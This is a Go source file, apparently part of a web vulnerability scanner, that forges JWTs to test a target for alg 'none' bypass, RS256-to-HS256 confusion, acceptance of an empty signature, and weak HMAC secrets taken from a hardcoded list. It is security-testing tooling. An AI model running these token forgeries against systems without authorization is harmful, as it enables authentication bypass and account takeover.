package modules

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"strings"
	"time"
)

// ScanJWT looks for JWT tokens provided via config headers or cookies, then
// tests for common misconfigurations:
//
//  1. Algorithm "none" (and case variants: None, NONE, nOnE)
//  2. RS256 → HS256 algorithm confusion
//  3. Empty / stripped signature accepted
//  4. Weak HMAC secret (HS256/HS384/HS512 only)
//
// Each test sends the manipulated token and compares the HTTP status against
// a baseline request sent WITHOUT any Authorization token.  If the
// unauthenticated baseline is already 200 the endpoint is not auth-protected
// and the result would be a false positive — those tests are skipped.
func ScanJWT(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	// ── Collect JWT candidates ──────────────────────────────────────────
	type candidate struct {
		src   string // human-readable origin label
		token string
	}
	var cands []candidate

	for k, v := range cfg.Headers {
		if strings.EqualFold(k, "authorization") {
			if tok, ok := extractBearer(v); ok && isJWT(tok) {
				cands = append(cands, candidate{"Authorization header", tok})
			}
		}
	}
	if cfg.Cookie != "" {
		for _, part := range strings.Split(cfg.Cookie, ";") {
			kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
			if len(kv) == 2 {
				val := strings.TrimSpace(kv[1])
				if isJWT(val) {
					cands = append(cands, candidate{"cookie:" + strings.TrimSpace(kv[0]), val})
				}
			}
		}
	}

	if len(cands) == 0 {
		return nil // no JWTs to test
	}

	// ── Establish unauthenticated baseline (no JWT) ─────────────────────
	// If this returns 200 the resource is public — JWT tests would be meaningless.
	noAuthStatus := probeNoAuth(client, cfg, target.URL)

	for _, c := range cands {
		headerB64, payloadB64, _, ok := splitJWT(c.token)
		if !ok {
			continue
		}
		alg := jwtHeaderAlg(headerB64)
		fmt.Printf("  [JWT] Candidate in %s (alg=%s)\n", c.src, alg)

		// Helper: run one JWT attack variant
		try := func(modToken, vulnType, evidence string) {
			if res := testJWTToken(client, cfg, target.URL, c.src, c.token, modToken, noAuthStatus, vulnType, evidence); res != nil {
				results = append(results, *res)
			}
		}

		// ── Attack 1: alg "none" ────────────────────────────────────────
		for _, variant := range []string{"none", "None", "NONE", "nOnE"} {
			try(
				buildJWT(jwtSetAlg(headerB64, variant), payloadB64, ""),
				"JWT Algorithm None Bypass",
				fmt.Sprintf("alg changed from %s → %q, signature stripped", alg, variant),
			)
		}

		// ── Attack 2: RS256 → HS256 confusion ──────────────────────────
		if strings.EqualFold(alg, "RS256") {
			// Algorithm confusion: sign with HS256 using common secret
			signingInput := headerB64 + "." + payloadB64
			confHeader := jwtSetAlg(headerB64, "HS256")
			// Try with "secret" as a fallback; the real attack uses the RSA public key
			// as the HMAC secret, which requires fetching from a JWKS endpoint
			mac := hmac.New(sha256.New, []byte("secret"))
			mac.Write([]byte(signingInput))
			confSig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
			try(
				buildJWT(confHeader, payloadB64, confSig),
				"JWT Algorithm Confusion (RS256→HS256)",
				"server accepted HS256 token when RS256 expected; HMAC key-confusion possible",
			)
		}

		// ── Attack 3: Empty signature ───────────────────────────────────
		try(
			buildJWT(headerB64, payloadB64, ""),
			"JWT Empty Signature Accepted",
			"server accepted JWT with empty signature segment",
		)

		// ── Attack 4: Weak HMAC secret ──────────────────────────────────
		if strings.HasPrefix(strings.ToUpper(alg), "HS") {
			weakSecrets := []string{
				"secret", "password", "123456", "qwerty", "admin", "token",
				"key", "jwt", "auth", "test", "changeme", "letmein",
				"your-256-bit-secret", "your-secret-key", "",
			}
			for _, sec := range weakSecrets {
				var sig string
				signingInput := headerB64 + "." + payloadB64
				switch strings.ToUpper(alg) {
				case "HS256":
					mac := hmac.New(sha256.New, []byte(sec))
					mac.Write([]byte(signingInput))
					sig = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
				case "HS384":
					mac := hmac.New(sha512.New384, []byte(sec))
					mac.Write([]byte(signingInput))
					sig = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
				case "HS512":
					mac := hmac.New(sha512.New, []byte(sec))
					mac.Write([]byte(signingInput))
					sig = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
				default:
					continue // unknown algorithm, skip
				}
				tok := buildJWT(headerB64, payloadB64, sig)
				if res := testJWTToken(client, cfg, target.URL, c.src, c.token, tok, noAuthStatus,
					"JWT Weak Secret",
					fmt.Sprintf("server accepted %s token re-signed with weak secret %q", alg, sec)); res != nil {
					results = append(results, *res)
					break // one weak secret confirmed is enough
				}
			}
		}
	}

	return results
}

// ── Helpers ──────────────────────────────────────────────────────────────────

func isJWT(s string) bool {
	p := strings.Split(s, ".")
	if len(p) != 3 {
		return false
	}
	// Each segment should be valid base64url (at least 1 char)
	for _, seg := range p[:2] {
		if len(seg) == 0 {
			return false
		}
	}
	// Header must decode to a JSON object
	data, err := base64.RawURLEncoding.DecodeString(p[0])
	if err != nil {
		return false
	}
	var m map[string]interface{}
	return json.Unmarshal(data, &m) == nil
}

func extractBearer(v string) (string, bool) {
	prefix := "bearer "
	if strings.HasPrefix(strings.ToLower(v), prefix) {
		return strings.TrimSpace(v[len(prefix):]), true
	}
	return "", false
}

func splitJWT(token string) (header, payload, sig string, ok bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", "", "", false
	}
	return parts[0], parts[1], parts[2], true
}

func jwtHeaderAlg(headerB64 string) string {
	data, err := base64.RawURLEncoding.DecodeString(headerB64)
	if err != nil {
		return "unknown"
	}
	var m map[string]interface{}
	if err := json.Unmarshal(data, &m); err != nil {
		return "unknown"
	}
	if alg, ok := m["alg"].(string); ok {
		return alg
	}
	return "unknown"
}

func jwtSetAlg(headerB64, newAlg string) string {
	data, err := base64.RawURLEncoding.DecodeString(headerB64)
	if err != nil {
		return headerB64
	}
	var m map[string]interface{}
	if err := json.Unmarshal(data, &m); err != nil {
		return headerB64
	}
	m["alg"] = newAlg
	newData, err := json.Marshal(m)
	if err != nil {
		return headerB64
	}
	return base64.RawURLEncoding.EncodeToString(newData)
}

func buildJWT(header, payload, sig string) string {
	return header + "." + payload + "." + sig
}

// probeNoAuth sends a request with no Authorization header / JWT cookie to
// determine whether the endpoint is auth-protected.  Returns the HTTP status.
func probeNoAuth(client *http.Client, cfg *core.Config, targetURL string) int {
	cfg.Limiter.Wait()
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return 0
	}
	// Apply all headers EXCEPT Authorization
	req.Header.Set("User-Agent", cfg.UserAgent)
	for k, v := range cfg.Headers {
		if !strings.EqualFold(k, "authorization") {
			req.Header.Set(k, v)
		}
	}
	if cfg.Cookie != "" {
		// Strip JWT-bearing cookie segments
		var safe []string
		for _, part := range strings.Split(cfg.Cookie, ";") {
			kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
			if len(kv) == 2 && !isJWT(strings.TrimSpace(kv[1])) {
				safe = append(safe, part)
			}
		}
		if len(safe) > 0 {
			req.Header.Set("Cookie", strings.Join(safe, "; "))
		}
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0
	}
	resp.Body.Close()
	return resp.StatusCode
}

// testJWTToken sends a request with the manipulated token and returns a
// core.ScanResult when the response indicates the server accepted the forgery.
func testJWTToken(
	client *http.Client, cfg *core.Config,
	targetURL, src, origToken, modToken string,
	noAuthStatus int,
	vulnType, evidence string,
) *core.ScanResult {
	// If endpoint is public (no auth required) skip the test
	if noAuthStatus == 200 {
		return nil
	}

	cfg.Limiter.Wait()
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil
	}
	core.ApplyHeaders(req, cfg)
	req.Header.Set("Authorization", "Bearer "+modToken)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()

	// Accepted if server returns 200 when unauthenticated baseline did not
	if resp.StatusCode == 200 && noAuthStatus != 200 {
		display := modToken
		if len(display) > 80 {
			display = display[:80] + "..."
		}
		result := &core.ScanResult{
			Type:      vulnType,
			URL:       targetURL,
			Method:    "GET",
			Parameter: src,
			Payload:   display,
			Severity:  "HIGH",
			Evidence:  fmt.Sprintf("HTTP %d accepted (baseline without token: %d) — %s", resp.StatusCode, noAuthStatus, evidence),
			Timestamp: time.Now(),
		}
		return result
	}
	return nil
}
